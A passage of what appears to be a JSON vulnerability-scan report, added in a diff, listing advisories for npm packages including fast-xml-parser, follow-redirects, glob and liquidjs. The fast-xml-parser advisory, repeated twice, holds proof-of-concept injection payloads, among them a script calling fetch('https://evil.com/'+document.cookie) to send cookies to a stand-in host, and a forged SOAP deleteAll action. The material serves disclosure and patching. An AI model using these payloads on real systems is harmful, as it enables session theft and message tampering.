+          "Description": "# fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters\n\n## Summary\n\nfast-xml-parser XMLBuilder does not escape the `--\u003e` sequence in comment content or the `]]\u003e` sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.\n\nExisting CVEs for fast-xml-parser cover different issues:\n- CVE-2023-26920: Prototype pollution (parser)\n- CVE-2023-34104: ReDoS (parser)\n- CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder\n- CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities\n\nThis finding covers **unescaped comment/CDATA delimiters in XMLBuilder** - a distinct vulnerability.\n\n## Vulnerable Code\n\n**File**: `src/fxb.js`\n\n```javascript\n// Line 442 - Comment building with NO escaping of --\u003e\nbuildTextValNode(val, key, attrStr, level) {\n    // ...\n    if (key === this.options.commentPropName) {\n        return this.indentate(level) + `\u003c!--${val}--\u003e` + this.newLine;  // VULNERABLE\n    }\n    // ...\n    if (key === this.options.cdataPropName) {\n        return this.indentate(level) + `\u003c![CDATA[${val}]]\u003e` + this.newLine;  // VULNERABLE\n    }\n}\n```\n\nCompare with attribute/text escaping which IS properly handled via `replaceEntitiesValue()`.\n\n## Proof of Concept\n\n### Test 1: Comment Injection (XSS in SVG/HTML context)\n\n```javascript\nimport { XMLBuilder } from 'fast-xml-parser';\n\nconst builder = new XMLBuilder({\n  commentPropName: \"#comment\",\n  format: true,\n  suppressEmptyNode: true\n});\n\nconst xml = {\n  root: {\n    \"#comment\": \"--\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e\u003c!--\",\n    data: \"legitimate content\"\n  }\n};\n\nconsole.log(builder.build(xml));\n```\n\n**Output**:\n```xml\n\u003croot\u003e\n  \u003c!----\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e\u003c!----\u003e\n  \u003cdata\u003elegitimate content\u003c/data\u003e\n\u003c/root\u003e\n```\n\n### Test 2: CDATA Injection (RSS feed)\n\n```javascript\nconst builder = new XMLBuilder({\n  cdataPropName: \"#cdata\",\n  format: true,\n  suppressEmptyNode: true\n});\n\nconst rss = {\n  rss: { channel: { item: {\n    title: \"Article\",\n    description: {\n      \"#cdata\": \"Content]]\u003e\u003cscript\u003efetch('https://evil.com/'+document.cookie)\u003c/script\u003e\u003c![CDATA[more\"\n    }\n  }}}\n};\n\nconsole.log(builder.build(rss));\n```\n\n**Output**:\n```xml\n\u003crss\u003e\n  \u003cchannel\u003e\n    \u003citem\u003e\n      \u003ctitle\u003eArticle\u003c/title\u003e\n      \u003cdescription\u003e\n        \u003c![CDATA[Content]]\u003e\u003cscript\u003efetch('https://evil.com/'+document.cookie)\u003c/script\u003e\u003c![CDATA[more]]\u003e\n      \u003c/description\u003e\n    \u003c/item\u003e\n  \u003c/channel\u003e\n\u003c/rss\u003e\n```\n\n### Test 3: SOAP Message Injection\n\n```javascript\nconst builder = new XMLBuilder({\n  commentPropName: \"#comment\",\n  format: true\n});\n\nconst soap = {\n  \"soap:Envelope\": {\n    \"soap:Body\": {\n      \"#comment\": \"Request from user: --\u003e\u003csoap:Body\u003e\u003cAction\u003edeleteAll\u003c/Action\u003e\u003c/soap:Body\u003e\u003c!--\",\n      Action: \"getBalance\",\n      UserId: \"12345\"\n    }\n  }\n};\n\nconsole.log(builder.build(soap));\n```\n\n**Output**:\n```xml\n\u003csoap:Envelope\u003e\n  \u003csoap:Body\u003e\n    \u003c!--Request from user: --\u003e\u003csoap:Body\u003e\u003cAction\u003edeleteAll\u003c/Action\u003e\u003c/soap:Body\u003e\u003c!----\u003e\n    \u003cAction\u003egetBalance\u003c/Action\u003e\n    \u003cUserId\u003e12345\u003c/UserId\u003e\n  \u003c/soap:Body\u003e\n\u003c/soap:Envelope\u003e\n```\n\nThe injected `\u003cAction\u003edeleteAll\u003c/Action\u003e` appears as a real SOAP action element.\n\n## Tested Output\n\nAll tests run on Node.js v22, fast-xml-parser v5.5.12:\n\n```\n1. COMMENT INJECTION:\n   Injection successful: true\n\n2. CDATA INJECTION (RSS feed scenario):\n   Injection successful: true\n\n4. Round-trip test:\n   Injection present: true\n\n5. SOAP MESSAGE INJECTION:\n   Contains injected Action: true\n```\n\n## Impact\n\nAn attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:\n\n1. **XSS**: Inject `\u003cscript\u003e` tags into XML/SVG/HTML documents served to browsers\n2. **SOAP injection**: Modify SOAP message structure by injecting XML elements\n3. **RSS/Atom feed poisoning**: Inject scripts into RSS feed items via CDATA breakout\n4. **XML document manipulation**: Break XML structure by escaping comment/CDATA context\n\nThis is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).\n\n## Suggested Fix\n\nEscape delimiters in comment and CDATA content:\n\n```javascript\n// For comments: replace -- with escaped equivalent\nif (key === this.options.commentPropName) {\n    const safeVal = String(val).replace(/--/g, '\u0026#45;\u0026#45;');\n    return this.indentate(level) + `\u003c!--${safeVal}--\u003e` + this.newLine;\n}\n\n// For CDATA: split on ]]\u003e and rejoin with separate CDATA sections\nif (key === this.options.cdataPropName) {\n    const safeVal = String(val).replace(/]]\u003e/g, ']]]]\u003e\u003c![CDATA[\u003e');\n    return this.indentate(level) + `\u003c![CDATA[${safeVal}]]\u003e` + this.newLine;\n}\n```",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+              "V3Score": 6.1
+            }
+          },
+          "References": [
+            "https://github.com/NaturalIntelligence/fast-xml-parser",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-27942",
+          "PkgID": "fast-xml-parser@5.2.5",
+          "PkgName": "fast-xml-parser",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/fast-xml-parser@5.2.5",
+            "UID": "36a01081aade4ccb",
+            "BOMRef": "pkg:npm/fast-xml-parser@5.2.5"
+          },
+          "InstalledVersion": "5.2.5",
+          "FixedVersion": "5.3.8, 4.5.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-27942",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "fast-xml-parser: fast-xml-parser: Stack overflow leads to Denial of Service",
+          "Description": "fast-xml-parser allows users to validate XML, parse XML to JS object, or build XML from JS object without C/C++ based libraries and no callback. Prior to version 5.3.8, the application crashes with stack overflow when user use XML builder with `preserveOrder:true`. Version 5.3.8 fixes the issue. As a workaround, use XML builder with `preserveOrder:false` or check the input data before passing to builder.",
+          "Severity": "LOW",
+          "CweIDs": [
+            "CWE-120"
+          ],
+          "VendorSeverity": {
+            "ghsa": 1,
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:U",
+              "V40Score": 2.7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-27942",
+            "https://github.com/NaturalIntelligence/fast-xml-parser",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/commit/c13a961910f14986295dd28484eee830fa1a0e8a",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/pull/791",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-fj3w-jwp8-x2g3",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-27942",
+            "https://www.cve.org/CVERecord?id=CVE-2026-27942"
+          ],
+          "PublishedDate": "2026-02-26T02:16:22.357Z",
+          "LastModifiedDate": "2026-03-02T14:54:48.08Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-41650",
+          "PkgID": "fast-xml-parser@5.5.8",
+          "PkgName": "fast-xml-parser",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/fast-xml-parser@5.5.8",
+            "UID": "757e51b4d7818324",
+            "BOMRef": "pkg:npm/fast-xml-parser@5.5.8"
+          },
+          "InstalledVersion": "5.5.8",
+          "FixedVersion": "5.7.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41650",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "fast-xml-parser XMLBuilder: XML Comment and CDATA Injection via Unescaped Delimiters",
+          "Description": "# fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters\n\n## Summary\n\nfast-xml-parser XMLBuilder does not escape the `--\u003e` sequence in comment content or the `]]\u003e` sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.\n\nExisting CVEs for fast-xml-parser cover different issues:\n- CVE-2023-26920: Prototype pollution (parser)\n- CVE-2023-34104: ReDoS (parser)\n- CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder\n- CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities\n\nThis finding covers **unescaped comment/CDATA delimiters in XMLBuilder** - a distinct vulnerability.\n\n## Vulnerable Code\n\n**File**: `src/fxb.js`\n\n```javascript\n// Line 442 - Comment building with NO escaping of --\u003e\nbuildTextValNode(val, key, attrStr, level) {\n    // ...\n    if (key === this.options.commentPropName) {\n        return this.indentate(level) + `\u003c!--${val}--\u003e` + this.newLine;  // VULNERABLE\n    }\n    // ...\n    if (key === this.options.cdataPropName) {\n        return this.indentate(level) + `\u003c![CDATA[${val}]]\u003e` + this.newLine;  // VULNERABLE\n    }\n}\n```\n\nCompare with attribute/text escaping which IS properly handled via `replaceEntitiesValue()`.\n\n## Proof of Concept\n\n### Test 1: Comment Injection (XSS in SVG/HTML context)\n\n```javascript\nimport { XMLBuilder } from 'fast-xml-parser';\n\nconst builder = new XMLBuilder({\n  commentPropName: \"#comment\",\n  format: true,\n  suppressEmptyNode: true\n});\n\nconst xml = {\n  root: {\n    \"#comment\": \"--\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e\u003c!--\",\n    data: \"legitimate content\"\n  }\n};\n\nconsole.log(builder.build(xml));\n```\n\n**Output**:\n```xml\n\u003croot\u003e\n  \u003c!----\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e\u003c!----\u003e\n  \u003cdata\u003elegitimate content\u003c/data\u003e\n\u003c/root\u003e\n```\n\n### Test 2: CDATA Injection (RSS feed)\n\n```javascript\nconst builder = new XMLBuilder({\n  cdataPropName: \"#cdata\",\n  format: true,\n  suppressEmptyNode: true\n});\n\nconst rss = {\n  rss: { channel: { item: {\n    title: \"Article\",\n    description: {\n      \"#cdata\": \"Content]]\u003e\u003cscript\u003efetch('https://evil.com/'+document.cookie)\u003c/script\u003e\u003c![CDATA[more\"\n    }\n  }}}\n};\n\nconsole.log(builder.build(rss));\n```\n\n**Output**:\n```xml\n\u003crss\u003e\n  \u003cchannel\u003e\n    \u003citem\u003e\n      \u003ctitle\u003eArticle\u003c/title\u003e\n      \u003cdescription\u003e\n        \u003c![CDATA[Content]]\u003e\u003cscript\u003efetch('https://evil.com/'+document.cookie)\u003c/script\u003e\u003c![CDATA[more]]\u003e\n      \u003c/description\u003e\n    \u003c/item\u003e\n  \u003c/channel\u003e\n\u003c/rss\u003e\n```\n\n### Test 3: SOAP Message Injection\n\n```javascript\nconst builder = new XMLBuilder({\n  commentPropName: \"#comment\",\n  format: true\n});\n\nconst soap = {\n  \"soap:Envelope\": {\n    \"soap:Body\": {\n      \"#comment\": \"Request from user: --\u003e\u003csoap:Body\u003e\u003cAction\u003edeleteAll\u003c/Action\u003e\u003c/soap:Body\u003e\u003c!--\",\n      Action: \"getBalance\",\n      UserId: \"12345\"\n    }\n  }\n};\n\nconsole.log(builder.build(soap));\n```\n\n**Output**:\n```xml\n\u003csoap:Envelope\u003e\n  \u003csoap:Body\u003e\n    \u003c!--Request from user: --\u003e\u003csoap:Body\u003e\u003cAction\u003edeleteAll\u003c/Action\u003e\u003c/soap:Body\u003e\u003c!----\u003e\n    \u003cAction\u003egetBalance\u003c/Action\u003e\n    \u003cUserId\u003e12345\u003c/UserId\u003e\n  \u003c/soap:Body\u003e\n\u003c/soap:Envelope\u003e\n```\n\nThe injected `\u003cAction\u003edeleteAll\u003c/Action\u003e` appears as a real SOAP action element.\n\n## Tested Output\n\nAll tests run on Node.js v22, fast-xml-parser v5.5.12:\n\n```\n1. COMMENT INJECTION:\n   Injection successful: true\n\n2. CDATA INJECTION (RSS feed scenario):\n   Injection successful: true\n\n4. Round-trip test:\n   Injection present: true\n\n5. SOAP MESSAGE INJECTION:\n   Contains injected Action: true\n```\n\n## Impact\n\nAn attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:\n\n1. **XSS**: Inject `\u003cscript\u003e` tags into XML/SVG/HTML documents served to browsers\n2. **SOAP injection**: Modify SOAP message structure by injecting XML elements\n3. **RSS/Atom feed poisoning**: Inject scripts into RSS feed items via CDATA breakout\n4. **XML document manipulation**: Break XML structure by escaping comment/CDATA context\n\nThis is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).\n\n## Suggested Fix\n\nEscape delimiters in comment and CDATA content:\n\n```javascript\n// For comments: replace -- with escaped equivalent\nif (key === this.options.commentPropName) {\n    const safeVal = String(val).replace(/--/g, '\u0026#45;\u0026#45;');\n    return this.indentate(level) + `\u003c!--${safeVal}--\u003e` + this.newLine;\n}\n\n// For CDATA: split on ]]\u003e and rejoin with separate CDATA sections\nif (key === this.options.cdataPropName) {\n    const safeVal = String(val).replace(/]]\u003e/g, ']]]]\u003e\u003c![CDATA[\u003e');\n    return this.indentate(level) + `\u003c![CDATA[${safeVal}]]\u003e` + this.newLine;\n}\n```",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+              "V3Score": 6.1
+            }
+          },
+          "References": [
+            "https://github.com/NaturalIntelligence/fast-xml-parser",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6"
+          ]
+        },
+        {
+          "VulnerabilityID": "GHSA-r4q5-vmmm-2653",
+          "PkgID": "follow-redirects@1.15.11",
+          "PkgName": "follow-redirects",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/follow-redirects@1.15.11",
+            "UID": "4e7f69cea42cdfe2",
+            "BOMRef": "pkg:npm/follow-redirects@1.15.11"
+          },
+          "InstalledVersion": "1.15.11",
+          "FixedVersion": "1.16.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-r4q5-vmmm-2653",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "follow-redirects leaks Custom Authentication Headers to Cross-Domain Redirect Targets",
+          "Description": "## Summary\n\nWhen an HTTP request follows a cross-domain redirect (301/302/307/308), `follow-redirects` only strips `authorization`, `proxy-authorization`, and `cookie` headers (matched by regex at index.js:469-476). Any custom authentication header (e.g., `X-API-Key`, `X-Auth-Token`, `Api-Key`, `Token`) is forwarded verbatim to the redirect target.\n\nSince `follow-redirects` is the redirect-handling dependency for **axios** (105K+ stars), this vulnerability affects the entire axios ecosystem.\n\n## Affected Code\n\n`index.js`, lines 469-476:\n\n```javascript\nif (redirectUrl.protocol !== currentUrlParts.protocol \u0026\u0026\n   redirectUrl.protocol !== \"https:\" ||\n   redirectUrl.host !== currentHost \u0026\u0026\n   !isSubdomain(redirectUrl.host, currentHost)) {\n  removeMatchingHeaders(/^(?:(?:proxy-)?authorization|cookie)$/i, this._options.headers);\n}\n```\n\nThe regex only matches `authorization`, `proxy-authorization`, and `cookie`. Custom headers like `X-API-Key` are not matched.\n\n## Attack Scenario\n\n1. App uses axios with custom auth header: `headers: { 'X-API-Key': 'sk-live-secret123' }`\n2. Server returns `302 Location: https://evil.com/steal`\n3. follow-redirects sends `X-API-Key: sk-live-secret123` to `evil.com`\n4. Attacker captures the API key\n\n## Impact\n\nAny custom auth header set via axios leaks on cross-domain redirect. Extremely common pattern. Affects all axios users in Node.js.\n\n## Suggested Fix\n\nAdd a `sensitiveHeaders` option that users can extend, or strip ALL non-standard headers on cross-domain redirect.\n\n## Disclosure\n\nSource code review, manually verified. Found 2026-03-20.",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 6.9
+            }
+          },
+          "References": [
+            "https://github.com/follow-redirects/follow-redirects",
+            "https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9",
+            "https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653"
+          ],
+          "PublishedDate": "2026-04-14T01:11:11Z",
+          "LastModifiedDate": "2026-04-14T01:11:11Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-64756",
+          "PkgID": "glob@10.3.16",
+          "PkgName": "glob",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/glob@10.3.16",
+            "UID": "dbed6584cfdf103c",
+            "BOMRef": "pkg:npm/glob@10.3.16"
+          },
+          "InstalledVersion": "10.3.16",
+          "FixedVersion": "11.1.0, 10.5.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-64756",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "glob: glob: Command Injection Vulnerability via Malicious Filenames",
+          "Description": "Glob matches files using patterns the shell uses. Starting in version 10.2.0 and prior to versions 10.5.0 and 11.1.0, the glob CLI contains a command injection vulnerability in its -c/--cmd option that allows arbitrary command execution when processing files with malicious names. When glob -c \u003ccommand\u003e \u003cpatterns\u003e are used, matched filenames are passed to a shell with shell: true, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges. This issue has been patched in versions 10.5.0 and 11.1.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-78"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-64756",
+            "https://github.com/isaacs/node-glob",
+            "https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f",
+            "https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146",
+            "https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-64756",
+            "https://www.cve.org/CVERecord?id=CVE-2025-64756"
+          ],
+          "PublishedDate": "2025-11-17T18:15:58.27Z",
+          "LastModifiedDate": "2025-12-02T19:34:43.27Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-35525",
+          "PkgID": "liquidjs@10.25.1",
+          "PkgName": "liquidjs",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/liquidjs@10.25.1",
+            "UID": "ecbc0cafc39a6f10",
+            "BOMRef": "pkg:npm/liquidjs@10.25.1"
+          },
+          "InstalledVersion": "10.25.1",
+          "FixedVersion": "10.25.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-35525",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "LiquidJS: Root restriction bypass for partial and layout loading through symlinked templates",
+          "Description": "LiquidJS is a Shopify / GitHub Pages compatible template engine in pure JavaScript. Prior to 10.25.3, for {% include %}, {% render %}, and {% layout %}, LiquidJS checks whether the candidate path is inside the configured partials or layouts roots before reading it. That check is path-based, not realpath-based. Because of that, a file like partials/link.liquid passes the directory containment check as long as its pathname is under the allowed root. If link.liquid is actually a symlink to a file outside the allowed root, the filesystem follows the symlink when the file is opened and LiquidJS renders the external target. So the restriction is applied to the path string that was requested, not to the file that is actually read. This matters in environments where an attacker can place templates or otherwise influence files under a trusted template root, including uploaded themes, extracted archives, mounted content, or repository-controlled template trees. This vulnerability is fixed in 10.25.3.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-61"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 7.5,
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/harttle/liquidjs",
+            "https://github.com/harttle/liquidjs/pull/867",
+            "https://github.com/harttle/liquidjs/releases/tag/v10.25.3",
+            "https://github.com/harttle/liquidjs/security/advisories/GHSA-56p5-8mhr-2fph",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-35525"
+          ],
+          "PublishedDate": "2026-04-08T20:16:24.913Z",
+          "LastModifiedDate": "2026-04-10T21:19:03.21Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-39412",
+          "PkgID": "liquidjs@10.25.1",
+          "PkgName": "liquidjs",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/liquidjs@10.25.1",
+            "UID": "ecbc0cafc39a6f10",
+            "BOMRef": "pkg:npm/liquidjs@10.25.1"
+          },
+          "InstalledVersion": "10.25.1",
+          "FixedVersion": "10.25.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-39412",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "LiquidJS: ownPropertyOnly bypass via sort_natural filter — prototype property information disclosure through sorting side-channel",
+          "Description": "LiquidJS is a Shopify / GitHub Pages compatible template engine in pure JavaScript. Prior to 10.25.4, the sort_natural filter bypasses the ownPropertyOnly security option, allowing template authors to extract values of prototype-inherited properties through a sorting side-channel attack. Applications relying on ownPropertyOnly: true as a security boundary (e.g., multi-tenant template systems) are exposed to information disclosure of sensitive prototype properties such as API keys and tokens. This vulnerability is fixed in 10.25.4.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-200"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V3Score": 5.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/harttle/liquidjs",
+            "https://github.com/harttle/liquidjs/commit/e743da0020d34e2ee547e1cc1a86b58377ebe1ce",
+            "https://github.com/harttle/liquidjs/pull/869",
+            "https://github.com/harttle/liquidjs/releases/tag/v10.25.4",
+            "https://github.com/harttle/liquidjs/security/advisories/GHSA-rv5g-f82m-qrvv",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-39412"
+          ],
+          "PublishedDate": "2026-04-08T20:16:25.733Z",
+          "LastModifiedDate": "2026-04-20T14:53:53.79Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-39859",
+          "PkgID": "liquidjs@10.25.1",
+          "PkgName": "liquidjs",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/liquidjs@10.25.1",
+            "UID": "ecbc0cafc39a6f10",
+            "BOMRef": "pkg:npm/liquidjs@10.25.1"
+          },
+          "InstalledVersion": "10.25.1",
+          "FixedVersion": "10.25.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-39859",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "LiquidJS: `renderFile()` / `parseFile()` bypass configured `root` and allow arbitrary file read",
+          "Description": "LiquidJS is a Shopify / GitHub Pages compatible template engine in pure JavaScript. Prior to 10.25.3, liquidjs 10.25.0 documents root as constraining filenames passed to renderFile() and parseFile(), but top-level file loads do not enforce that boundary. A Liquid instance configured with an empty temporary directory as root can return the contents of arbitrary files. This vulnerability is fixed in 10.25.3.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 6.3
+            }
+          },
+          "References": [
+            "https://github.com/harttle/liquidjs",
+            "https://github.com/harttle/liquidjs/commit/f41c1fc02fe901598f3328118b42b13bc6bc9b04",
+            "https://github.com/harttle/liquidjs/pull/870",
+            "https://github.com/harttle/liquidjs/releases/tag/v10.25.5",
+            "https://github.com/harttle/liquidjs/security/advisories/GHSA-v273-448j-v4qj",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-39859"
+          ],
+          "PublishedDate": "2026-04-08T20:16:26.273Z",
+          "LastModifiedDate": "2026-04-10T21:18:42.4Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-34166",
+          "PkgID": "liquidjs@10.25.1",
+          "PkgName": "liquidjs",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/liquidjs@10.25.1",
+            "UID": "ecbc0cafc39a6f10",
+            "BOMRef": "pkg:npm/liquidjs@10.25.1"
+          },
+          "InstalledVersion": "10.25.1",
+          "FixedVersion": "10.25.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-34166",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "LiquidJS Has Memory Limit Bypass via Quadratic Amplification in `replace` Filter",
+          "Description": "LiquidJS is a Shopify / GitHub Pages compatible template engine in pure JavaScript. Prior to 10.25.3, the replace filter in LiquidJS incorrectly accounts for memory usage when the memoryLimit option is enabled. It charges str.length + pattern.length + replacement.length bytes to the memory limiter, but the actual output from str.split(pattern).join(replacement) can be quadratically larger when the pattern occurs many times in the input string. This allows an attacker who controls template content to bypass the memoryLimit DoS protection with approximately 2,500x amplification, potentially causing out-of-memory conditions. This vulnerability is fixed in 10.25.3.",
+          "Severity": "LOW",
+          "CweIDs": [
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 1,
+            "nvd": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 3.7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 5.3
+            }
+          },
+          "References": [
+            "https://github.com/harttle/liquidjs",
+            "https://github.com/harttle/liquidjs/commit/abc058be0f33d6372cd2216f4945183167abeb25",
+            "https://github.com/harttle/liquidjs/releases/tag/v10.25.3",
+            "https://github.com/harttle/liquidjs/security/advisories/GHSA-mmg9-6m6j-jqqx",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-34166"
+          ],
+          "PublishedDate": "2026-04-08T19:25:21.4Z",
+          "LastModifiedDate": "2026-04-10T21:19:24.237Z"
